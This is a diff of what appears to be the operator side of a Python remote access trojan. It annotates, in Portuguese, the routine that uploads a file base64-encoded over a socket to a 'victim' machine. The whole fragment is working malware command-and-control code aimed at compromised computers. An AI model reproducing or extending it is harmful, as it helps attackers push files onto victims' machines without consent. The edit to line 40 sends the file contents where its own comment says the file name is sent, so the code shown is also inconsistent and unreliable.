@@ -106,18 +106,21 @@ if __name__ == '__main__':
 
             elif command.startswith('upload'):
                 try:  # 36
-                    local_file = command.split()[1]  # 37
-                    remote_file = command.split()[2]  # 38
+                    local_file = command.split()[1]  # 37: Arquvivo local a ser enviado para o PC da vítima.
+                    remote_file = command.split()[2]  # 38: Nome que o arquivo vai receber no PC da vítima.
 
                     with open(local_file, 'rb') as reader:
-                        _file = reader.read()  # 39
+                        _file = reader.read()  # 39: Realiza a leitura do arquivo para enviar o mesmo.
                 
-                    victims[victim].sock.send(f'Upload %s' % remote_file)  # 40
+                    victims[victim].sock.send(f'Upload {_file}')  # 40: Envia para o PC da vítima o nome do arquivo.
                     print('Wait until the upload be finished ...')
+                    # 41: Envia, em base64, para o PC da vítima o arquivo.
+                    # O caracter '\n' serve para mostrar o final da transmissão.
                     victims[victim].sock.sendall(base64.b64encode(_file) + '\n')  # 41
-                    response = victims[victim].sock.recv(26)  # 42
+                    # 42: Aguarda o recebimento de 26 bytes de resposta da máquina da vítima.
+                    response = victims[victim].sock.recv(26)  # 42 
 
-                    if '\r' in response:  # 43
+                    if '\r' in response:  # 43: O caractere '\r' mostra que o socket da vítima levou timeout mas permanece ativo.
                         print(victims[victim].sock.recv(26))  # 44
                     else:  # 45
                         print(response)
